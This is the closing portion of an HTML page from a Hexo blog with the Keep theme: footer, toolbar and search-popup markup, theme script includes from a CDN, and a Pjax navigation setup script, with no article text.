            ç”± <a target="_blank" href="https://hexo.io">Hexo</a> é©±åŠ¨&nbsp;|&nbsp;ä¸»é¢˜&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item flex-center toggle-show-toc">
                <i class="fas fa-list"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="tools-item flex-center go-to-comments">
                <i class="fas fa-comment"></i>
                <span class="post-comments-count"></span>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    
        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

</main>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>



    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>


<div class="post-scripts pjax">
    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
        
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
        
    
</div>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
<script>
    window.addEventListener('DOMContentLoaded', () => {
        window.pjax = new Pjax({
            selectors: [
                'head title',
                '.page-container',
                '.pjax'
            ],
            history: true,
            debug: false,
            cacheBust: false,
            timeout: 0,
            analytics: false,
            currentUrlFullReload: false,
            scrollRestoration: false,
            // scrollTo: true,
        });

        document.addEventListener('pjax:send', () => {
            KEEP.utils.pjaxProgressBarStart();
        });

        document.addEventListener('pjax:complete', () => {
            KEEP.utils.pjaxProgressBarEnd();
            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
            KEEP.refresh();
        });
    });
</script>



</body>
</html>
